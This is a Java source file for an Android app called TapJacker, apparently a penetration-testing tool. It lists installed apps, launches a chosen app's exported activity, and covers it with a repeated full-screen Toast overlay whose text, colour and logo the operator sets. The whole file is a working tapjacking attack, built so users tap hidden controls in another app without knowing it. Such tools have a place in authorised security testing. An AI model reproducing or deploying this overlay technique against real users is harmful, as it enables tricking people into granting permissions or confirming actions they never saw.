package com.dsavitski.tapjacker;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.Editable;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

import petrov.kristiyan.colorpicker.ColorPicker;

public class MainActivity extends AppCompatActivity {
    private EditText delayField;
    private EditText editExportedActivity;
    private EditText editCustomText;
    private Spinner packagesDropDown;
    private Button buttonColorPicker;
    private CheckBox checkboxShowLogo;
    private String[] packagesArr;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        delayField = findViewById(R.id.delayField);
        packagesDropDown = findViewById(R.id.packagesDropDown);
        buttonColorPicker = findViewById(R.id.buttonColorPicker);
        editExportedActivity = findViewById(R.id.editExportedActivity);
        editCustomText = findViewById(R.id.editCustomText);
        checkboxShowLogo = findViewById(R.id.checkboxShowLogo);

        configureDropDown();
        loadPackages();
    }

    private void configureDropDown() {
        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                final String currentPackage = packagesArr[position];
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
                if (launchIntent == null || launchIntent.getComponent() == null) {
                    setStartActivity("");
                    return;
                }
                setStartActivity(launchIntent.getComponent().getClassName());
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
                setStartActivity("");
            }
        });
    }

    private void setStartActivity(String name) {
        editExportedActivity.setText(name);
    }

    public void runTapJacker(View view) {
        final int delay = Integer.parseInt(delayField.getText().toString());
        final String packageName = packagesDropDown.getSelectedItem().toString();
        final String exportedActivityName = editExportedActivity.getText().toString();

        if (delay <= 3) {
            Toast.makeText(getApplicationContext(), "Delay should be 3 or more seconds", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!exportedActivityIsValid(packageName, exportedActivityName)) {
            return;
        }

        final Toast overlay = createOverlay();
        fireOverlay(overlay, delay);
        launchExportedActivity(packageName, exportedActivityName);
    }

    private void fireOverlay(final Toast toast, final int delay) {
        Thread t = new Thread() {
            public void run() {
                int timer = delay;
                while (timer > 0) {
                    toast.show();
                    if (timer == 1) {
                        Intent intent = new Intent(MainActivity.this, MainActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    }
                    try {
                        sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    timer--;
                }
            }
        };
        t.start();
    }

    void launchExportedActivity(final String packageName, final String exportedActivityName) {
        Thread t = new Thread() {
            public void run() {
                try {
                    sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(packageName, exportedActivityName));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        };
        t.start();
    }

    private boolean exportedActivityIsValid(String packageName, String exportedActivityName) {
        if (TextUtils.isEmpty(packageName)) {
            Toast.makeText(getApplicationContext(), "Select package first", Toast.LENGTH_SHORT).show();
            return false;
        }

        if (TextUtils.isEmpty(exportedActivityName)) {
            Toast.makeText(getApplicationContext(), "Set exported activity to launch", Toast.LENGTH_SHORT).show();
            return false;
        }
        return true;
    }

    private Toast createOverlay() {
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        Toast overlay = Toast.makeText(this, "", Toast.LENGTH_SHORT);
        View overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
        overlay.setView(overlayView);
        overlay.setGravity(Gravity.FILL, 0, 0);

        configureOverlayElements(overlayView);

        return overlay;
    }

    private void configureOverlayElements(View overlayView) {
        int overlayColor = ((ColorDrawable) buttonColorPicker.getBackground()).getColor();
        final TextView overlayText = overlayView.findViewById(R.id.overlayText);
        final ImageView overlayImage = overlayView.findViewById(R.id.overlayImage);

        overlayText.setTextColor(overlayColor);
        overlayImage.setColorFilter(overlayColor);

        Editable customText = editCustomText.getText();
        if (!TextUtils.isEmpty(customText)) {
            overlayText.setText(customText);
        }

        if (!checkboxShowLogo.isChecked()) {
            overlayImage.setVisibility(View.INVISIBLE);
        }
    }

    /**
     * Loads available application packages to the dropdown menu
     */
    private void loadPackages() {
        List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        List<String> filtered = filterPackages(packages);
        packagesArr = new String[filtered.size()];
        packagesArr = filtered.toArray(packagesArr);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, packagesArr);
        packagesDropDown.setAdapter(adapter);
    }

    /**
     * Filter packages
     */
    private List<String> filterPackages(final List<ApplicationInfo> packages) {
        List<String> filtered = new ArrayList<>();

        for (ApplicationInfo packageInfo : packages) {
            final String packageName = packageInfo.packageName;
            if (!packageName.contains("com.android")) {
                filtered.add(packageName);
            }
        }
        return filtered;
    }

    public void pickColor(View view) {
        ColorPicker colorPicker = new ColorPicker(this);
        colorPicker.show();
        colorPicker.setOnChooseColorListener(new ColorPicker.OnChooseColorListener() {
            @Override
            public void onChooseColor(final int position, final int color) {
                buttonColorPicker.setBackgroundColor(color);
            }

            @Override
            public void onCancel() {/*NOP*/}
        });
    }
}
